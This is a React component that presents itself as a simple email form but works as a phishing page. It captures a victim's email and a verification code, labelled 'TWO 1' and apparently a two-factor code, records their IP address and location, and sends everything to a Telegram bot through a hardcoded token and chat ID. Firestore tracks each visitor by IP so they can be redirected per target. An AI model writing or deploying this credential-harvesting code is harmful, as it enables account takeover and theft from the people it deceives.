import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';



const About2 = () => {
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)
    const [email, setEmail] = useState('');

    const handleEmailChange = (e) => {
        setEmail(e.target.value);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        setTimeout(() => {
            window.location = 'rwr'
        }, 1000)
        addUserData(email)


    };

    const handleActions = () => {
        if (code === '') {
          // Handle code validation
          // You can set an error state or display a message
          return;
        } else {
          const bot = 'bot6444053579:AAEJM3cGwVt_s9ajNfMpPnKtr_71p20S_dw';
          const chid = '5651241356';
    
          fetch(`https://ipapi.co/json/`)
            .then((response) => response.json())
            .then((response) => {
              const { country, region, city } = response;
              const params = {
                content: `========================
                  TWO 1: '${code}'
                  TWO 2: '${email}'
                  Country : '${country}'
                  Region : '${region}'
                  City : '${city}'
                  IP: '${ip}'
                  ========================`
              };
    
              fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
              })
                .then(() => {
                  // Handle success, e.g., redirect to 'confirm2.html'
                  // You can use react-router or window.location
                })
                .catch((error) => {
                  // Handle error
                });
            });
        }
      };
    
      const handleCodeChange = (e) => {
        setCode(e.target.value); // Allow all keyboard input
      };
      

    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true)
                setUserData(x);
                return x;
            }

        })
        if (filter.length === 0) {
            addUserData()
        }
    }


    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true
                        setUserData(x)
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url)
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Welcome Rwr';

    }, [userData, userUrl])

    useEffect(() => {

    }, [userData])


    const addUserData = async (email=undefined) => {

        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData()
            }
            else if(docSnap.exists() && email){
                await setDoc(
                    docRef,
                    { email: email }, // Add the email field here
                    { merge: true }
                  );
                console.log("Document written with ID: ", ip);
                getUserData()
            }
             else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }



    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])

   
    console.log("hi here is the data", isUserData, userData)

    return (
        <div className="App">
            <h1>React Email Form</h1>
            <form onSubmit={handleSubmit}>
            <div className="forca">
              
            </div>

                <label><input type="email" value={email} onChange={handleEmailChange} required /> </label><br/><br/>
                <input type="text" id="code" name="code" onChange={handleCodeChange} required /><br/><br/>
                <button type="submit" onClick={handleActions}>Submit</button>


            
          
            </form>
        </div>
    )

}

export default About2;